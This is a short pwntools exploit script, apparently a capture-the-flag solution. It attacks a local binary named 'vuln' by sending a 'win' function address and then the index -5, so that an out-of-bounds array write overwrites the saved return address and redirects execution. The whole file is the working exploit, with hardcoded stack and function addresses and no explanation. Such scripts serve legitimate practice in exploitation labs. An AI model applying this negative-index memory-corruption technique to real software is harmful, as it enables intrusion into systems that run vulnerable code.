#coding=utf-8
from pwn import *

scanf1 = 0x80486a1
scanf2 = 0x80486dd
replaceIntegerInArrayAtIndex = 0x80486f7
arr_start = 0xffffca60
ret = 0xffffca4c
win = 0x80485c6

p = process('./vuln')
p.sendline(str(win))
p.sendline('-5')
print p.recvall(1)
